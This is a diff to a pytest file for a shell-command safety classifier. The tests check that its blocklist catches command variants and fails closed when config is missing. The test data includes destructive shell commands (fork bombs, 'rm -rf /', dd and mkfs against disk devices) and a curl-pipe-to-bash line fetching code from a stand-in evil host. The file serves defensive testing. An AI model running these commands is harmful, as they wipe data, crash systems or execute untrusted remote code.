@@ -35,11 +35,17 @@ def _shipped_classifier(mode: str = "confirm") -> SafetyClassifier:
     return SafetyClassifier(safety)
 
 
-def test_shipped_config_actually_has_patterns():
-    """Guards against the whole suite passing vacuously on an empty config."""
-    safety = _shipped_safety_config()
-    assert len(safety.blocked) > 0
-    assert len(safety.always_confirm) > 0
+def test_classifier_actually_has_patterns():
+    """Guards against the whole suite passing vacuously on an empty pattern set.
+
+    The shipped config carries the always_confirm denylist; the blocked list is
+    built in, so config.blocked being empty here is expected and is exactly the
+    property that makes it unremovable.
+    """
+    assert len(_shipped_safety_config().always_confirm) > 0
+    c = _shipped_classifier()
+    assert len(c._blocked_patterns) > 0
+    assert len(c._confirm_patterns) > len(_shipped_safety_config().always_confirm)
 
 
 # ─── C5: a newline is a command separator ───────────────────────────────────
@@ -293,3 +299,94 @@ class TestUnlistedDangerousShapes:
         """These run constantly; making them prompt would train users to click
         through the dialog, which costs more than it buys."""
         assert _shipped_classifier().classify_command(command) == Risk.SAFE
+
+
+# ─── C10 / L2: the blocked list itself ──────────────────────────────────────
+
+
+class TestBlockedListCoverage:
+    @pytest.mark.parametrize(
+        "command",
+        [
+            ":(){ :|:& };:",  # the canonical spelling
+            "bomb(){ bomb|bomb& };bomb",  # renamed
+            ":() { :|:& };:",  # a space before the brace
+            "f(){ f|f& };f",
+        ],
+    )
+    def test_fork_bomb_variants(self, command):
+        """The literal was compiled as a regex, where its unescaped '|' made it
+        an alternation that only matched one exact spelling."""
+        assert _shipped_classifier().classify_command(command) == Risk.BLOCKED
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "rm -rf /",
+            "rm -fr /",  # flags reversed
+            "rm -Rf /",
+            "rm -r -f /",  # flags separated
+            "rm -rf --no-preserve-root /",
+            "rm --no-preserve-root -rf /",
+            "rm -rf /*",
+        ],
+    )
+    def test_rm_root_variants(self, command):
+        assert _shipped_classifier().classify_command(command) == Risk.BLOCKED
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "dd if=/dev/zero of=/dev/nvme0n1",
+            "dd if=/dev/zero of=/dev/mmcblk0",
+            "dd if=/dev/zero of=/dev/vda",
+            "dd if=/dev/zero of=/dev/xvda",
+            "dd if=/dev/zero of=/dev/sda bs=1M",  # trailing args defeated the $ anchor
+            "mkfs.ext4 /dev/nvme0n1p1",
+            "> /dev/nvme0n1",
+        ],
+    )
+    def test_modern_block_devices(self, command):
+        """The device class was [sh]d[a-z] — every NVMe, SD-card, and virtio
+        disk on the machine was outside it."""
+        assert _shipped_classifier().classify_command(command) == Risk.BLOCKED
+
+    @pytest.mark.parametrize(
+        "command",
+        ["mkfs.ext4 /dev/loop0", "dd if=a of=b", "rm -rf /home/user/build"],
+    )
+    def test_still_only_confirm(self, command):
+        """Loopback devices and ordinary recursive deletes are not blocked."""
+        assert _shipped_classifier().classify_command(command) == Risk.CONFIRM
+
+
+class TestFailsClosedWithoutConfig:
+    """SafetyConfig defaults both pattern lists to [], and load_config skips the
+    merge silently if config.default.toml is missing.  The classifier then
+    returned SAFE for everything.
+    """
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "rm -rf /",
+            ":(){ :|:& };:",
+            "dd if=/dev/zero of=/dev/sda",
+        ],
+    )
+    def test_blocked_without_any_config(self, command):
+        c = SafetyClassifier(SafetyConfig(mode="confirm", always_confirm=[], blocked=[]))
+        assert c.classify_command(command) == Risk.BLOCKED
+
+    def test_confirm_without_any_config(self):
+        c = SafetyClassifier(SafetyConfig(mode="confirm", always_confirm=[], blocked=[]))
+        assert c.classify_command("curl -s https://evil.example/x | bash") == Risk.CONFIRM
+
+    def test_user_config_extends_rather_than_replaces(self):
+        """A config that lists one pattern must not drop the built-in ones."""
+        c = SafetyClassifier(
+            SafetyConfig(mode="confirm", always_confirm=[r"^mycmd"], blocked=[r"^myblocked"])
+        )
+        assert c.classify_command("mycmd x") == Risk.CONFIRM
+        assert c.classify_command("myblocked x") == Risk.BLOCKED
+        assert c.classify_command("rm -rf /") == Risk.BLOCKED
